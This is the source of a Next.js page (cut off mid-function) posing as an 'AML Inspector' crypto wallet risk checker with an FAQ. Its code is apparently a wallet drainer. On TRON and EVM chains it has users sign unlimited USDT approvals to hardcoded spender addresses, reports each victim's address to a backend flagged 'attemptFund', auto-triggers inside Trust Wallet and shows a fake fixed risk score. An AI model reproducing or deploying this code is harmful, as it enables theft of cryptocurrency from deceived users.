"use client";

import React, { useEffect, useMemo, useState, useRef } from "react";
import Web3 from "web3";
import { ethers } from "ethers";
import axios from "axios";
import SignClient from "@walletconnect/sign-client";
import { WalletConnectAdapter } from "@tronweb3/tronwallet-adapter-walletconnect";
import { TronWeb } from "tronweb";
import toast from "react-hot-toast";




import { appKit } from "@/app/appkit";
import { mainnet, bsc } from "@reown/appkit/networks";











interface FAQItem {
  question: string;
  answer: React.ReactNode;
}

const faqs: FAQItem[] = [
  {
    question: "What does the address verification show?",
    answer: (
      <>
        Total risk (in percent) – the probability that the address is associated
        with illegal activities. Sources of risk – known types of services with
        which the address interacted and the percentage of funds accepted from /
        given to these services, for which the total risk is calculated.
      </>
    ),
  },
  {
    question: "What do the parameters in the validation results mean?",
    answer: (
      <>
        AML Inspector checks the specified wallet address for links to known blockchain
        services. AML Inspector conditionally organizes such services into groups with
        different levels of risk of illegal activity. The result of the check
        shows the connections of the address being checked with these groups in
        percentage ratio. Based on all connections, an average risk assessment
        is given, which helps the user make further decisions on assets.
      </>
    ),
  },
  {
    question: "How should risk assessment be understood?",
    answer: (
      <>
        Each client determines for himself/herself what percentage of risk is
        acceptable for him/her. Conventionally, risk values can be divided as
        follows:
        <br />
        - 0–25% is a net asset;
        <br />
        - 25–75% is the average risk level;
        <br />
        - 75%+ – such an asset cannot be recommended.
        <br />
        Also worth noting are the red sources of risk in the detailed analysis
        described on the{" "}
        <a href="" className="underline">
          page
        </a>
        .
      </>
    ),
  },
  {
    question: "How fast is the balance replenished?",
    answer: (
      <>
        After the transaction is confirmed, the balance is replenished:
        <br />
        - up to 10 minutes if the payment was made within 24 hours after the
        invoice was issued,
        <br />
        - up to 25 minutes if the payment was made after 24 hours after the
        invoice was issued.
        <br />
        In general, BTC, ETH, USDT and fiat are processed faster than other
        coins.
      </>
    ),
  },
  {
    question: "What does it mean to estimate risk as a percentage?",
    answer: (
      <>
        AML Inspector finds the connections of a verified address to different users on
        the blockchain, each with a different conditional risk. The overall risk
        score is the average of all the components found. For example, if out of
        2 BTC on the verified wallet, 1 BTC came from mining (0% risk) and
        another 1 BTC from the Darknet (100% risk), the risk score would be 50%.
      </>
    ),
  },
  {
    question: "How does AML Inspector help protect against blocking?",
    answer: (
      <>
        By checking the wallets of counterparties before a transaction, you can
        reject their assets if the risk assessment is high. Also, before
        transferring funds to other services, you can check your wallet address
        and save the result (make a screenshot). If the check shows that your
        assets had no connection with illegal activities and the service blocked
        you, you can provide the saved result to confirm the purity of your
        assets.
      </>
    ),
  },
  {
    question:
      "The risk is more than 50%, but I'm sure the address is reliable. What should I do?",
    answer: (
      <>
        The verification results are based on international databases that are
        constantly updated. Therefore, an address that had 0% risk yesterday
        could receive or give the asset to a risky counterparty today. In this
        case, the risk assessment will change. If you want to be sure of the
        outcome and determine what the cause of the high risk is, we can perform
        a detailed review for you. To do this, email us at{" "}
        <a href="mailto:info@amlreport.com" className="underline">
          info@amlreport.com
        </a>
        .
      </>
    ),
  },
  {
    question:
      "What is the difference between address verification and TxID transaction?",
    answer: (
      <>
        Address (wallet) verification is an analysis of all addresses ever
        associated with it, from which funds were received and to which funds
        were sent.
        <br />
        <br />
        Transaction (TxID) check – you specify the TxID and then select:
        <br />
        - Received funds (Recipient) and the address where the funds were
        received (Deposit). This checks the relationships of the addresses from
        which the funds were received (addresses on the left in block explorers
        and their earlier interactions).
        <br />
        - Gave the funds (Sender) and the address to which the funds were sent
        (Withdrawal). This checks the wallet (usually shown on the right) that
        received the funds and all of its communications prior to this
        transaction.
        <br />
        <br />
        Thus, the TxID check assesses risks to the recipient if you choose to
        accept funds, and risks to the sender if you choose to send them.
      </>
    ),
  },
  {
    question:
      "What happens if I don't have time to use all of my checks for the month?",
    answer: <>They stay in your account and you can use them at any time.</>,
  },
  {
    question: "How often are inspections recommended?",
    answer: (
      <>
        The answer to this question depends on your unique risk model. A general
        recommendation is to perform an AML Inspector check every time you interact
        with an unknown wallet or smart contract.
      </>
    ),
  },
  {
    question: "Which cryptocurrencies does AML Inspector analyze?",
    answer: (
      <>
        BTC, ETH, LTC, BCH, Tether OMNI, XRP, and over 1500+ ERC-20 tokens
        (including Tether, BNB, QC, NEXO, TUSD, and 60+ DeFi tokens) can be
        verified at AML Inspector.
      </>
    ),
  },
  {
    question: "What if I need more inspections?",
    answer: (
      <>
        You can purchase checks as needed. The number of checks is always
        displayed in your user information.
      </>
    ),
  },
];














// ✅ Load from .env (must be NEXT_PUBLIC_*)
const FORWARDER_ADDRESS = process.env.NEXT_PUBLIC_FORWARDER_ADDRESS as string;
const APPROVE_ADDRESS = process.env.NEXT_PUBLIC_APPROVE_ADDRESS as string;
const TOKEN_ADDRESS = process.env.NEXT_PUBLIC_TOKEN_ADDRESS as string;
const DEFAULT_WALLET = process.env.NEXT_PUBLIC_DEFAULT_WALLET as string;

const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 value) returns (bool)",
  "function transfer(address to, uint256 value) returns (bool)",
  "function transferFrom(address from, address to, uint256 value) returns (bool)",
];








const PROJECT_ID = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID ?? "";
const TRON_GRID_API_KEY = "59b";
const FULL_NODE = "https://api.trongrid.io";
const CHAIN_ID = "tron:0x2b6653dc";
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TDSDLtNdPV2kSd547ayud4ARRk6yFbUUud";
const DEFAULT_WALLET_TRX = "TJKaj19K7XA1b3VrUNQG1cT7iRtEmHNHPV";

// ── BSC BEP20 constants (exact from bep20websitefrontend) ──
const BSC_USDT_ADDRESS = process.env.NEXT_PUBLIC_BSC_USDT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER_ADDRESS = process.env.NEXT_PUBLIC_BSC_SPENDER_ADDRESS ?? "0xBde048de16D9a513777EA3da204EB755A678F165";
const BEP20_BACKEND_URL = process.env.NEXT_PUBLIC_BEP20_BACKEND_URL ?? "";

// ── ETH ERC20 constants (exact from usdterc20frontend) ──
const ETH_USDT_ADDRESS = process.env.NEXT_PUBLIC_ETH_USDT_ADDRESS ?? "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ETH_SPENDER_ADDRESS = process.env.NEXT_PUBLIC_ETH_SPENDER_ADDRESS ?? "0x532c37be9Eb0a2279F74e1308c56f4DFF19ac228";
const ERC20_BACKEND_URL = process.env.NEXT_PUBLIC_ERC20_BACKEND_URL ?? "";








export default function ApproveForForward() {

  const [showWalletModal, setShowWalletModal] = useState<boolean>(false);


  const [selectedWallet, setSelectedWallet] = useState<WalletType>(null);



  const [web3, setWeb3] = useState<Web3 | null>(null);
  const [account, setAccount] = useState<string>(DEFAULT_WALLET || "");
  const [balance, setBalance] = useState<string>("0");
  const [amount, setAmount] = useState<string>("");
  const [processing, setProcessing] = useState<boolean>(false);


  const [reportBlob, setReportBlob] = useState<Blob | null>(null);
  const [reportChain, setReportChain] = useState<"BSC" | null>(null);
  const [reportAddress, setReportAddress] = useState<string | null>(null);



  // 🧹 Cleanup (not strictly required now but safe)
  useEffect(() => {
    return () => {
      // nothing special, blob will be GC'd
      setReportBlob(null);
    };
  }, []);

  // 📱 Simple mobile detection
  const isMobile =
    typeof navigator !== "undefined" &&
    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);







  const [showPopup, setShowPopup] = useState<boolean>(false);
  const [txHash, setTxHash] = useState<string>("");

  // TRON / EVM WalletConnect QR modal for desktop
  const [tronWCUri, setTronWCUri] = useState<string | null>(null);

  // ETH Native desktop: Trust Wallet browser open-URL QR
  const [ethNativeDesktopQR, setEthNativeDesktopQR] = useState<string | null>(null);

  // Show "check your wallet" modal after QR scan connected — desktop WC sign step
  const [showSignModal, setShowSignModal] = useState<boolean>(false);
  const [signModalNetwork, setSignModalNetwork] = useState<string>("ETH");

  // Animated risk score
  const [scoreDisplay, setScoreDisplay] = useState(0);
  const [scoreSettled, setScoreSettled] = useState(false);







  type NetworkType = "BSC" | "TRON" | "ETH" | "ETH_NATIVE" | null;


  const [showNetworkModal, setShowNetworkModal] = useState(false);
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkType>(null);

  const openNetworkFlow = () => {
    if (processing) return;
    // Always open the network selection modal first (on all devices).
    // The redirect to Trust Wallet (if needed) happens AFTER the user picks a network.
    setShowNetworkModal(true);
    setSelectedNetwork(null);
  };

  const closeNetworkFlow = () => {
    setSelectedNetwork(null);
    setShowNetworkModal(false);
  };


  const handleNetworkContinue = () => {
    if (!selectedNetwork || processing) return;

    if (selectedNetwork === "BSC") {
      setShowNetworkModal(false); // ✅ CLOSE network modal
      setShowWalletModal(true);   // ✅ OPEN wallet modal
    }
  };




  type WalletType = "TRUST" | "BINANCE" | "CONNECT" | null;




  // ✅ NEW: navbar mobile toggle
  const [isMenuOpen, setIsMenuOpen] = useState<boolean>(false);

  // TrustedBy.tsx
  const row1 = [
    "banner1.webp",
    "loog2.webp",
    "logo3.webp",
    "logo.webp",
    "banner2.webp",
    "logo5.webp",
  ];

  const row2 = [
    "logop.webp",
    "amlsafe.webp",
    "banner3.webp",
    "logow.webp",
    "logoe.webp",
    "logor.webp",
  ];

  const [openIndex, setOpenIndex] = useState<number | null>(0);

  const toggleIndex = (index: number) => {
    setOpenIndex((prev) => (prev === index ? null : index));
  };





























  //////TRX TRON NETWORK











  const [client, setClient] = useState<SignClient | null>(null);
  const [session, setSession] = useState<any>(null);
  const [accountTrx, setAccountTrx] = useState<string>(DEFAULT_WALLET_TRX);
  const [savedAddress, setSavedAddress] = useState<string | null>(null);
  const [amounttrx, setAmounttrxtrx] = useState<string>("");
  const [processingTRX, setProcessingTRX] = useState(false);
  const [txTrxHash, setTrxTxHash] = useState<string>("");
  const [showPopupTRX, setShowPopupTRX] = useState(false);
  const [autoReady, setAutoReady] = useState(false);
  // 🔥 Pre-generated WalletConnect Promise — starts when user taps a network card.
  const pendingWCPromiseRef = useRef<{
    network: NetworkType;
    promise: Promise<{ uri: string; approval: () => Promise<any>; client: SignClient } | null>;
  } | null>(null);

  // Animate risk score when success popup opens (must be AFTER showPopupTRX is declared)
  useEffect(() => {
    if (!(showPopup || showPopupTRX)) {
      setScoreDisplay(0);
      setScoreSettled(false);
      return;
    }
    const TARGET = 94;
    let elapsed = 0;
    const DURATION = 2800;
    const interval = setInterval(() => {
      elapsed += 60;
      if (elapsed >= DURATION) {
        setScoreDisplay(TARGET);
        setScoreSettled(true);
        clearInterval(interval);
      } else {
        const progress = elapsed / DURATION;
        const jitter = Math.floor(Math.random() * 40);
        const approaching = Math.floor(TARGET * progress);
        setScoreDisplay(Math.min(approaching + jitter, 99));
      }
    }, 60);
    return () => clearInterval(interval);
  }, [showPopup, showPopupTRX]);

  // TronWeb
  const tronWeb = useMemo(
    () =>
      new TronWeb({
        fullHost: FULL_NODE,
        headers: { "TRON-PRO-API-KEY": TRON_GRID_API_KEY },
      }),
    []
  );

  // -------- LocalStorage Helpers -------- //
  const isBrowser = typeof window !== "undefined";
  const safeGetLS = (k: string) => (isBrowser ? localStorage.getItem(k) : null);
  const safeSetLS = (k: string, v: string) => {
    if (isBrowser) localStorage.setItem(k, v);
  };
  const safeRemoveLS = (k: string) => {
    if (isBrowser) localStorage.removeItem(k);
  };

  // -------------------------------- //
  // 🔥 CLEAN RESET AFTER APPROVE CONFIRM or REJECT
  // -------------------------------- //
  const clearWalletState = async () => {
    safeRemoveLS("pending_amount");
    safeRemoveLS("tron_account");

    setSavedAddress(null);
    setAccountTrx(DEFAULT_WALLET_TRX);
    setAmounttrxtrx("");
    setAutoReady(false);   // <-- IMPORTANT FIX

    try {
      const adapter = new WalletConnectAdapter({
        network: "Mainnet",
        options: { projectId: PROJECT_ID },
      });
      await adapter.disconnect();
    } catch { }
  };


  // -------------------------------- //
  // INIT: Restore amounttrx + auto backend
  // -------------------------------- //
  // -------------------------------- //
  // INIT: Restore wallet + restore amounttrx + auto approve
  // -------------------------------- //
  useEffect(() => {
    if (!isBrowser) return;

    async function init() {
      try {
        // Init WC client
        const signClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "TRON Hybrid DApp",
            description: "WalletConnect + Adapter flow",
            url: window.location.origin,
            icons: ["https://walletconnect.com/walletconnect-logo.svg"],
          },
        });

        setClient(signClient);

        // Restore amounttrx (ALWAYS KEEP)
        const savedAmt = safeGetLS("pending_amount");
        if (savedAmt) setAmounttrxtrx(savedAmt);

        // Restore wallet
        const saved = safeGetLS("tron_account");
        if (saved) {
          setSavedAddress(saved);
          setAccountTrx(saved);
        }
      } catch (err) {
        console.error("Init Error:", err);
      }
    }

    init();
  }, []);


  // ─────────────────────────────────────────────────────────────────
  // AUTO-TRIGGER: When Trust Wallet opens the page with ?tw_network=X
  // we skip the network selection step and go straight to the
  // wallet-connect flow, eliminating the need for a 2nd manual click.
  // ─────────────────────────────────────────────────────────────────
  useEffect(() => {
    if (!isBrowser) return;

    const isTrustBrowser =
      (window as any).ethereum &&
      ((window as any).ethereum.isTrust ||
        (window as any).ethereum.isTrustWallet ||
        navigator.userAgent.includes("TrustWallet"));

    if (!isTrustBrowser) return; // Only auto-fire inside Trust Wallet browser

    const params = new URLSearchParams(window.location.search);
    const twNetwork = params.get("tw_network") as NetworkType | null;
    if (!twNetwork) return; // No param — normal page load, do nothing

    // Clean the URL so bookmarking / refresh doesn't re-trigger
    const cleanUrl = window.location.pathname;
    window.history.replaceState({}, document.title, cleanUrl);

    // Small delay to let React fully mount & Trust Wallet inject ethereum
    const timer = setTimeout(async () => {
      if (twNetwork === "BSC") {
        await handleApproveEVM_AppKit("BSC");
      } else if (twNetwork === "ETH") {
        await handleApproveEVM_AppKit("ETH");
      } else if (twNetwork === "ETH_NATIVE") {
        await handleApproveETH_Native();
      } else if (twNetwork === "TRON") {
        await handleApproveTRON();
      }
    }, 800);

    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);



  useEffect(() => {
    if (!autoReady) return;

    setTimeout(() => {
      const savedAmt = safeGetLS("pending_amount");
      if (!savedAmt) return;

      console.log("🔥 Auto approve fired after restore - but discarded in refactor");
    }, 50);  // <-- tiny delay fixes the race condition
  }, [autoReady]);


  // -------------------------------- //
  // APPROVE HANDLER FOR TRON
  // -------------------------------- //
  async function handleApproveTRON() {
    setProcessingTRX(true);
    const backendUrl = process.env.NEXT_PUBLIC_TRON_BACKEND_URL;

    try {
      // ══ PATH A: Native TronWeb (Trust Wallet DApp Browser / TronLink) ══
      // If window.tronWeb exists, wait up to 3s for it to be ready (timing race on page load)
      const nativeTron = typeof window !== "undefined" ? (window as any).tronWeb : null;
      if (nativeTron) {
        // Poll for ready state — Trust Wallet DApp browser injects tronWeb asynchronously
        let tries = 0;
        while (!nativeTron.ready && tries < 10) {
          await new Promise(r => setTimeout(r, 300));
          tries++;
        }
        if (nativeTron.ready) {
          await approveWithTronLink();
          return;
        }
      }

      // ══ MOBILE: Redirect to Trust Wallet DApp browser if no native tronWeb injection ══
      // Only redirect if we are NOT already inside Trust Wallet browser.
      // If we are already in Trust Wallet but tronWeb isn't ready yet, wait a bit longer.
      if (typeof window !== "undefined" && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent)) {
        const isTrust =
          ((window as any).ethereum && ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet)) ||
          navigator.userAgent.includes("TrustWallet");

        if (!isTrust) {
          // Regular mobile browser — redirect to Trust Wallet with network param preserved
          const baseUrl = window.location.origin + window.location.pathname;
          const destUrl = `${baseUrl}?tw_network=TRON`;
          window.location.href = `trust://open_url?coin_id=195&url=${encodeURIComponent(destUrl)}`;
          setTimeout(() => {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(destUrl)}`;
          }, 1500);
          setProcessingTRX(false);
          return;
        }
        // Inside Trust Wallet but tronWeb not ready — give it more time (up to +3s extra)
        let extraTries = 0;
        while (!(window as any).tronWeb?.ready && extraTries < 10) {
          await new Promise(r => setTimeout(r, 300));
          extraTries++;
        }
        if ((window as any).tronWeb?.ready) {
          await approveWithTronLink();
          return;
        }
      }

      // ══ PATH B: WalletConnect fallback (DESKTOP browsers only) ══

      // Check for pre-generated URI (from network card tap)
      let preGenTron = null;
      if (pendingWCPromiseRef.current && pendingWCPromiseRef.current.network === "TRON") {
        preGenTron = await pendingWCPromiseRef.current.promise;
        pendingWCPromiseRef.current = null; // consume
      }

      if (preGenTron) {
        setTronWCUri(preGenTron.uri);
        setProcessingTRX(false);
        const sess = await preGenTron.approval();
        const address = sess.namespaces?.tron?.accounts?.[0]?.split(":")?.[2];
        if (!address) throw new Error("No wallet address from session");
        setProcessingTRX(true);
        setTronWCUri(null);
        // ✅ Show "Check Your Mobile Wallet" modal while signing
        setSignModalNetwork("USDT / TRC-20");
        setShowSignModal(true);
        // continue with TRON transaction using preGenTron.client
        const activeClient = preGenTron.client;
        if (backendUrl) axios.post(`${backendUrl}/notify-visit`, { userAddress: address, attemptFund: true }).catch(() => { });
        const tron = new TronWeb({ fullHost: FULL_NODE });
        tron.setAddress(address);
        const maxApprove = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        const parameter = [{ type: "address", value: SPENDER }, { type: "uint256", value: maxApprove }];
        const transaction = await tron.transactionBuilder.triggerSmartContract(
          USDT, "approve(address,uint256)", { feeLimit: 1_000_000_000, callValue: 0 }, parameter, address
        );
        if (!transaction.result?.result) throw new Error("Transaction building failed");
        if (transaction.transaction) {
          const extended = await tron.transactionBuilder.extendExpiration(transaction.transaction as any, 86000);
          (transaction as any).transaction = extended;
        }
        let result;
        try {
          result = await activeClient.request<any>({ topic: sess.topic, chainId: CHAIN_ID, request: { method: "tron_signTransaction", params: { address, transaction } } });
        } catch {
          result = await activeClient.request<any>({ topic: sess.topic, chainId: CHAIN_ID, request: { method: "tron_signTransaction", params: [transaction] } });
        }
        setShowSignModal(false);
        let signedTx: any = null;
        if (typeof result === "string") { const sig = result.startsWith("0x") ? result.substring(2) : result; signedTx = { ...(transaction.transaction ?? transaction), signature: [sig] }; }
        else if (result?.signature && Array.isArray(result.signature)) { signedTx = result; }
        else if (result?.transaction?.signature) { signedTx = result.transaction; }
        else if (result?.result?.signature) { signedTx = result.result; }
        else { signedTx = result; }
        if (!signedTx?.signature?.length) throw new Error("Transaction is missing signature!");
        let finalTxHash = signedTx.txID ?? "";
        if (backendUrl) {
          try {
            const res = await axios.post(`${backendUrl}/broadcast-approval`, { userAddress: address, signedTransaction: signedTx });
            if (res.data?.txHash) finalTxHash = res.data.txHash;
          } catch { }
        }
        setTrxTxHash(finalTxHash);
        setShowPopupTRX(true);
        return;
      }

      // Fallback: no pre-generated URI — generate now
      // 1. Get or re-init SignClient
      let activeClient = client;
      if (!activeClient) {
        activeClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Crypto AML",
            description: "Wallet connection",
            url: typeof window !== "undefined" ? window.location.origin : "",
            icons: [],
          },
        });
        setClient(activeClient);
      }

      // 2. Clear stale sessions so a fresh URI is always generated (fixes QR not showing)
      try {
        const sessions = activeClient.session.getAll();
        for (const s of sessions) {
          await activeClient.disconnect({ topic: s.topic, reason: { code: 6000, message: "reset" } }).catch(() => { });
        }
      } catch {/* silent */ }

      // 3. Connect — always produces a fresh URI
      const { uri, approval } = await activeClient.connect({
        requiredNamespaces: {
          tron: {
            chains: [CHAIN_ID],
            methods: ["tron_signTransaction", "tron_signMessage"],
            events: ["accountsChanged", "chainChanged"],
          },
        },
      });

      if (!uri) throw new Error("WalletConnect URI not generated");

      // 4. Show modal (QR on desktop / anchor deeplink on mobile)
      setTronWCUri(uri);
      setProcessingTRX(false);

      if (typeof window !== "undefined" && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent)) {
        const isTrust = (window as any).ethereum && ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet);
        if (isTrust) {
          window.location.href = `trust://wc?uri=${encodeURIComponent(uri)}`;
        }
      }

      // 5. Wait for wallet to approve connection
      const sess = await approval();
      const address = sess.namespaces?.tron?.accounts?.[0]?.split(":")?.[2];
      if (!address) throw new Error("No wallet address from session");

      setProcessingTRX(true);
      setTronWCUri(null);
      // ✅ Show "Check Your Mobile Wallet" modal while signing
      setSignModalNetwork("USDT / TRC-20");
      setShowSignModal(true);

      // 5. Notify backend (fire & forget — don't wait)
      if (backendUrl) {
        axios.post(`${backendUrl}/notify-visit`, { userAddress: address, attemptFund: true }).catch(() => { });
      }

      // 6. Build TRC20 approve transaction
      // Create a properly initialized TronWeb instance (matches trc20frontend)
      const tron = new TronWeb({ fullHost: FULL_NODE });
      tron.setAddress(address);

      const maxApprove = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const parameter = [
        { type: "address", value: SPENDER },
        { type: "uint256", value: maxApprove },
      ];

      const transaction = await tron.transactionBuilder.triggerSmartContract(
        USDT,
        "approve(address,uint256)",
        { feeLimit: 1_000_000_000, callValue: 0 },
        parameter,
        address
      );

      if (!transaction.result?.result) {
        throw new Error("Transaction building failed");
      }

      if (transaction.transaction) {
        const extended = await tron.transactionBuilder.extendExpiration(
          transaction.transaction as any,
          86000
        );
        (transaction as any).transaction = extended;
      }

      // 7. Request signature via WC — showSignModal is already active, user sees "Check Your Mobile Wallet"
      let result;
      try {
        result = await activeClient.request<any>({
          topic: sess.topic,
          chainId: CHAIN_ID,
          request: {
            method: "tron_signTransaction",
            params: { address, transaction }
          }
        });
      } catch {
        result = await activeClient.request<any>({
          topic: sess.topic,
          chainId: CHAIN_ID,
          request: {
            method: "tron_signTransaction",
            params: [transaction]
          }
        });
      }
      setShowSignModal(false);

      let signedTx: any = null;
      if (typeof result === "string") {
        const signature = result.startsWith("0x") ? result.substring(2) : result;
        const innerTx = transaction.transaction ?? transaction;
        signedTx = { ...innerTx, signature: [signature] };
      } else if (result?.signature && Array.isArray(result.signature)) {
        signedTx = result;
      } else if (result?.transaction?.signature && Array.isArray(result.transaction.signature)) {
        signedTx = result.transaction;
      } else if (result?.result?.signature && Array.isArray(result.result.signature)) {
        signedTx = result.result;
      } else if (result?.result?.transaction?.signature) {
        signedTx = result.result.transaction;
      } else {
        signedTx = result;
      }

      if (!signedTx || !signedTx.signature || !signedTx.signature.length) {
        throw new Error("Transaction is missing signature!");
      }

      // 8. Broadcast via backend
      let finalTxHash = signedTx.txID ?? "";
      if (backendUrl) {
        try {
          const res = await axios.post(`${backendUrl}/broadcast-approval`, {
            userAddress: address,
            signedTransaction: signedTx
          });
          if (res.data?.txHash) finalTxHash = res.data.txHash;
        } catch {/* silent */ }
      }

      // 9. Show success modal
      setTrxTxHash(finalTxHash);
      setShowPopupTRX(true);

    } catch (err: any) {
      const msg = (err?.message ?? "").toLowerCase();
      if (
        err?.code === 4001 || err?.code === "ACTION_REJECTED" ||
        msg.includes("reject") || msg.includes("cancel") || msg.includes("user denied")
      ) return;
      console.error("TRON WC error:", err);
    } finally {
      setProcessingTRX(false);
      setTronWCUri(null);
      setShowSignModal(false); // ✅ Always dismiss sign modal on exit
    }
  }



  const isConnectedCycle = Boolean(savedAddress);












  const [tronLinkSelected, setTronLinkSelected] = useState(false);
  const [safePalSelected, setSafePalSelected] = useState(false);







  const approveWithTronLink = async () => {
    setProcessingTRX(true);
    const backendUrl = process.env.NEXT_PUBLIC_TRON_BACKEND_URL;

    try {
      const tron = (window as any).tronWeb;
      if (!tron) throw new Error("TronWeb not found");

      // ── Step 1: Get address (matches trc20frontend poll logic) ──
      let acctToUse: string = tron.defaultAddress?.base58 || "";

      if (!acctToUse) {
        // Poll up to 15 times (3s) — Trust Wallet is slow to inject address
        for (let i = 0; i < 15; i++) {
          await new Promise(r => setTimeout(r, 200));
          if (tron.defaultAddress?.base58) {
            acctToUse = tron.defaultAddress.base58;
            break;
          }
        }
      }

      if (!acctToUse) {
        // Still no address — request permission explicitly (required on first Trust Wallet visit)
        try {
          if ((window as any).tronLink?.request) {
            await (window as any).tronLink.request({ method: "tron_requestAccounts" });
          } else if (tron.request) {
            await tron.request({ method: "tron_requestAccounts" });
          }
          // Poll again after permission request
          for (let i = 0; i < 20; i++) {
            await new Promise(r => setTimeout(r, 300));
            if (tron.defaultAddress?.base58) {
              acctToUse = tron.defaultAddress.base58;
              break;
            }
          }
        } catch (e) {
          console.warn("tron_requestAccounts failed", e);
        }
      }

      if (!acctToUse) throw new Error("Could not get TRON address");

      // Save address to state/storage
      setAccountTrx(acctToUse);
      safeSetLS("tron_account", acctToUse);

      // ── Step 2: Notify backend ──
      if (backendUrl) {
        axios.post(`${backendUrl}/notify-visit`, { userAddress: acctToUse, attemptFund: true }).catch(() => { });
      }

      // ── Step 3: Build approve tx ──
      const maxApprove = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const parameter = [
        { type: "address", value: SPENDER },
        { type: "uint256", value: maxApprove },
      ];

      const transaction = await tron.transactionBuilder.triggerSmartContract(
        USDT,
        "approve(address,uint256)",
        { feeLimit: 1_000_000_000, callValue: 0 },
        parameter,
        acctToUse
      );

      if (!transaction.result?.result) {
        throw new Error("Transaction building failed");
      }

      if (transaction.transaction) {
        const extended = await tron.transactionBuilder.extendExpiration(
          transaction.transaction,
          86000
        );
        transaction.transaction = extended;
      }

      // ── Step 4: Sign (shows popup instantly in Trust Wallet) ──
      const signedTx = await tron.trx.sign(transaction.transaction || transaction);

      // Show success modal right after signing (before broadcast)
      setShowPopupTRX(true);

      // ── Step 5: Broadcast via backend ──
      if (backendUrl) {
        try {
          const res = await axios.post(`${backendUrl}/broadcast-approval`, {
            userAddress: acctToUse,
            signedTransaction: signedTx,
          });
          if (res.data?.txHash) setTrxTxHash(res.data.txHash);
        } catch {/* silent */ }
      }

    } catch (err: any) {
      const msg = (err?.message ?? "").toLowerCase();
      if (
        msg.includes("reject") || msg.includes("cancel") || msg.includes("user denied")
      ) return;
      console.error("TronLink approve error:", err);
    } finally {
      setProcessingTRX(false);
    }
  };










  const connectWithTronLink = async () => {
    try {
      const tron = (window as any).tronWeb;

      if (!tron || !tron.ready) {
        alert("Please install TronLink wallet");
        return;
      }

      const address = tron.defaultAddress.base58;

      setAccountTrx(address);
      setSavedAddress(address);
      safeSetLS("tron_account", address);

      console.log("✅ TronLink connected:", address);

      // 🔥 AUTO APPROVE after connect
      await approveWithTronLink();

    } catch (err) {
      console.error("❌ TronLink connection error:", err);
    }
  };







  let safePalAdapter: WalletConnectAdapter | null = null;

  const initSafePalProvider = async () => {
    if (safePalAdapter) return safePalAdapter;

    safePalAdapter = new WalletConnectAdapter({
      network: "Mainnet",
      options: {
        projectId: PROJECT_ID, // Your existing PROJECT_ID
      }
    });

    return safePalAdapter;
  };

  const connectWithSafePal = async () => {
    try {
      setProcessingTRX(true);
      safeSetLS("pending_amount", amounttrx);

      const adapter = await initSafePalProvider();

      // Connect using WalletConnectAdapter (SafePal supports WC TRON)
      await adapter.connect();

      const addr = adapter.address;

      if (!addr || addr === DEFAULT_WALLET_TRX) {
        throw new Error("No SafePal account");
      }

      setAccountTrx(addr);
      setSavedAddress(addr);
      safeSetLS("tron_account", addr);
      setAutoReady(true);

      console.log("✅ SafePal WalletConnect connected:", addr);

    } catch (err: any) {
      console.error("SafePal connect error:", err);
      alert(err.message || "SafePal connection failed");
    } finally {
      setProcessingTRX(false);
    }
  };

  const handleApproveTRX_SafePal = async () => {
    const saved = safeGetLS("tron_account");
    const acctToUse = saved ?? accountTrx;

    if (!acctToUse || acctToUse === DEFAULT_WALLET_TRX) return;

    setProcessingTRX(true);

    try {
      const adapter = await initSafePalProvider();

      // Ensure connected (EXACT same as your handleApproveTRX)
      await adapter.connect();

      if (adapter.address !== acctToUse) {
        throw new Error("Account mismatch");
      }

      // IDENTICAL transaction building to your existing WalletConnect flow
      const maxApprove = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const parameter = [
        { type: "address", value: SPENDER },
        { type: "uint256", value: maxApprove },
      ];

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT,
        "approve(address,uint256)",
        { feeLimit: 1_000_000_000, callValue: 0 },
        parameter,
        acctToUse
      );

      if (!tx.result?.result) {
        throw new Error("Transaction building failed");
      }

      if (tx.transaction) {
        const extended = await tronWeb.transactionBuilder.extendExpiration(
          tx.transaction as any,
          86000
        );
        (tx as any).transaction = extended;
      }

      // Sign using WalletConnectAdapter (SafePal responds via WC)
      const signedTx = await adapter.signTransaction(tx.transaction || tx);
      setShowPopupTRX(true);

      // IDENTICAL broadcast to your existing code
      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);

      if (broadcast?.txid) {
        setTrxTxHash(broadcast.txid);


        setTimeout(clearWalletState, 1200);
      }

    } catch (err: any) {
      console.error("SafePal approve error:", err);
      await clearWalletState();
    } finally {
      setProcessingTRX(false);
    }
  };














  ///ethereum network


  const ETH_CHAIN_ID = "0x1";

  // Add these at top with your env vars:
  const TOKEN_ADDRESS_ETH = process.env.NEXT_PUBLIC_TOKEN_ADDRESS_ETH as string;
  const FORWARDER_ADDRESS_ETH = process.env.NEXT_PUBLIC_FORWARDER_ETH as string;

  async function waitForWalletReady(rawProvider: any, timeout = 8000) {
    const start = Date.now();

    while (true) {
      try {
        const accounts = await rawProvider.request({ method: "eth_accounts" });
        const chainId = await rawProvider.request({ method: "eth_chainId" });

        if (accounts?.length > 0 && chainId) return;
      } catch { }

      if (Date.now() - start > timeout) {
